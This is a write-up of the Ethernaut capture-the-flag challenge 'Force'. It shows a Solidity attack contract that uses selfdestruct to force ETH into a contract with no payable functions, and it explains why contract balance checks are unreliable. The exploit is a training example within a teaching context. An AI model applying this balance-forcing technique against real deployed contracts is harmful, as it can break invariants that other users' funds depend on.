# Ethernaut Challenge #7: Force

**Objective:** Make the balance of Force contract > 0.

**Contract Analysis:**
```solidity
contract Force {/*
                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)
*/}
```

**That's it.** Empty contract. No payable functions. No receive. No fallback.

**The Challenge:**
How do you send ETH to a contract that rejects all ETH?

**The Solution:**

`selfdestruct()`

**What is selfdestruct?**
- Destroys a contract
- Sends ALL remaining ETH to a target address
- **CANNOT BE BLOCKED**
- Works even if target has no payable functions

**The Attack:**
```solidity
contract Attack {
  function attack(address payable _target) public payable {
    require(msg.value > 0);
    
    // Destroy this contract, force ETH to _target
    selfdestruct(_target);
  }
}
```

**How it works:**
1. Deploy Attack contract with 1 wei
2. Call `attack(forceContractAddress)`
3. Attack contract self-destructs
4. ETH is FORCED to Force contract
5. Balance > 0

**Why This Matters:**

You cannot rely on `address(this).balance == 0` as a security check.

Contracts can receive ETH via:
- `selfdestruct()` (forced)
- Coinbase rewards (miner payments)
- Pre-calculated contract addresses

**Lesson:**
Never assume a contract has zero balance. `selfdestruct` bypasses ALL checks.

**Status:** Challenge understood. Force ETH with destruction.
